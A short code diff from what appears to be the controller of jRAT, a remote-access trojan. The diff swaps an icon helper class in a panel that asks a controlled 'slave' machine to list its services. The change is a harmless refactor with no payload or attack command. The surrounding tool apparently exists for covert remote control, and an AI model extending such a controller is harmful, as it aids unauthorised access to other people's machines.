@@ -1,6 +1,6 @@
 package jrat.controller.ui.panels;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet77ListServices;
 import jrat.controller.ui.DefaultJTable;
@@ -36,7 +36,7 @@ public class PanelControlServices extends PanelControlParent {
 				slave.addToSendQueue(new Packet77ListServices());
 			}
 		});
-		btnRefreshList.setIcon(IconUtils.getIcon("block"));
+		btnRefreshList.setIcon(Resources.getIcon("block"));
 
 		JButton btnClear = new JButton("Clear");
 		btnClear.addActionListener(new ActionListener() {
@@ -44,7 +44,7 @@ public class PanelControlServices extends PanelControlParent {
 				clear();
 			}
 		});
-		btnClear.setIcon(IconUtils.getIcon("clear"));
+		btnClear.setIcon(Resources.getIcon("clear"));
 
 		GroupLayout groupLayout = new GroupLayout(this);
 		groupLayout.setHorizontalGroup(
